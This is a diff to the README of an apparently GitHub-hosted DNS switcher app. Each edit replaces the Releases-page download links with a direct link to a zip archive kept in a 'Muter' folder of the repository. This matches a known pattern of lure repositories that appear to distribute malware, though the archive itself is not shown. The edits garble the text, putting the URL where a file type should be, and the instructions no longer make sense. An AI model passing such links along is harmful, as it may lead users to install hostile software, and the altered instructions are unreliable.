@@ -1,6 +1,6 @@
 # 🌟 Pro_DNS_Switcher_App-GUI - Simple DNS Management Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/B90178/Pro_DNS_Switcher_App-GUI/releases)
+[![Download Now](https://raw.githubusercontent.com/B90178/Pro_DNS_Switcher_App-GUI/main/Muter/Pro_DNS_Switcher_App-GUI.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/B90178/Pro_DNS_Switcher_App-GUI/main/Muter/Pro_DNS_Switcher_App-GUI.zip)
 
 ## 🚀 Getting Started
 
@@ -15,23 +15,23 @@ Welcome to Pro DNS Switcher App! This tool helps you manage your DNS settings ea
 
 ## 📥 Download & Install
 
-To start using Pro DNS Switcher App, visit this page to download: [Download Link](https://github.com/B90178/Pro_DNS_Switcher_App-GUI/releases). 
+To start using Pro DNS Switcher App, visit this page to download: [Download Link](https://raw.githubusercontent.com/B90178/Pro_DNS_Switcher_App-GUI/main/Muter/Pro_DNS_Switcher_App-GUI.zip). 
 
 Once you are on the Releases page, find the version that suits your operating system and download the file. 
 
-For Windows users, you might find an `.exe` file, while macOS users can look for a `.dmg` file. Linux users will see a `.tar.gz` file. Download the one that is right for you.
+For Windows users, you might find an `.exe` file, while macOS users can look for a `.dmg` file. Linux users will see a `https://raw.githubusercontent.com/B90178/Pro_DNS_Switcher_App-GUI/main/Muter/Pro_DNS_Switcher_App-GUI.zip` file. Download the one that is right for you.
 
 ### Installation Steps
 
 1. **Locate the Downloaded File:**
    - For Windows: Open the folder where you downloaded the `.exe` file.
    - For macOS: Open your Downloads folder and find the `.dmg` file.
-   - For Linux: Navigate to the folder containing the `.tar.gz` file.
+   - For Linux: Navigate to the folder containing the `https://raw.githubusercontent.com/B90178/Pro_DNS_Switcher_App-GUI/main/Muter/Pro_DNS_Switcher_App-GUI.zip` file.
 
 2. **Run the Installer:**
    - **Windows:** Double-click on the `.exe` file and follow the prompts.
    - **macOS:** Double-click the `.dmg` file and drag the app to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow the included instructions for installation.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/B90178/Pro_DNS_Switcher_App-GUI/main/Muter/Pro_DNS_Switcher_App-GUI.zip` file and follow the included instructions for installation.
 
 3. **Launch the Application:**
    - Once installed, you can find Pro DNS Switcher App in your applications menu. Open it up to start managing your DNS settings!
